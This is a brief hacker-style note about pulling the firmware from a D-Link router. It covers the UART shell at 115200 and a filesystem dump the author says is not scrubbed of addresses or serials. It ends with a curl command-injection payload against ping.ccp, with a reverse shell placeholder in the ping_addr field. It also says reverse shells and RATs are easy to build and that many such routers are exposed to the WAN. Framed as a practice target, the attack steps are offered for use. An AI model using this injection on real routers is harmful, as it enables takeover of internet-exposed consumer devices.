# Taking a dumparooski from a Dlink DIR363L "cloud" router.

DLink D636L "Cloud Router". Has RT6856F CPU, soic16 flash rom on the backside of the PCB, 1gig ports, nvme/tiny pci slot for wifi card, and thruholes for uart pins. UARTing into this thing will get you a shell, 115200 should work. Standard cheap MIPS environment. Easy to build revsh's and rats, lots of these exposed to the WAN.
<BR><BR>
dir636l.tar.gz has the whole filesystem (not scrubbed for addresses or serials, im not using this thing in prod ever so enjoy). Still has vulns, great as a practice target. Look for tools_vst.asp and/or ping.ccp when hunting for juice on this device. "curl -X POST --data 'ccp_act=ping_v6&ping_addr=$(SUPER NIFTY REVERSE SHELL HERE)' -i http://target-router/ping.ccp"
